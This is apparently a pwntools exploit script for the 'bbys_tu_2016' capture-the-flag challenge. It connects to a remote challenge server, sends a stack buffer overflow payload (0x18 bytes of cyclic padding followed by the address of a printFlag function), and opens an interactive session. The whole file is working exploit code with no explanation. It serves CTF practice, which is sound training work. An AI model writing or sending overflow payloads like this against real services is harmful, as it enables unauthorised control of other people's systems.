from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('bbys_tu_2016')
io = remote('node4.buuoj.cn', 27913)
elf = ELF('bbys_tu_2016')

printFlag = elf.symbols['printFlag']
payload = cyclic(0x18) + p32(printFlag)
io.sendline(payload)
io.interactive()

